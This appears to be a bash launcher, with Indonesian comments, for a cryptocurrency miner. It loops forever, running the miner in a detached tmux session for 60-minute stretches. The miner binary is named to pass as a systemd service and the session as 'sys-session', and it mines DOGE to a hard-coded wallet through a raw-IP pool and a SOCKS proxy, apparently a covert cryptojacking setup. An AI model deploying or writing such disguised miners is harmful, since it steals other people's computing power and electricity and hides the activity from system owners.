#!/bin/bash

while true
do
    echo "Menjalankan tmux selama 60 menit..."
    tmux new -d -s sys-session "timeout 60m ./systemd_service.sh --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=DOCKOTO10menitEXIT --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145"
    
    # Tunggu hingga tmux selesai (60 menit)
    sleep 60m

    echo "Jeda 10 menit..."
    # Hentikan sesi tmux jika masih berjalan
    tmux kill-session -t sys-session

    # Tunggu selama 10 menit
    sleep 10m
done
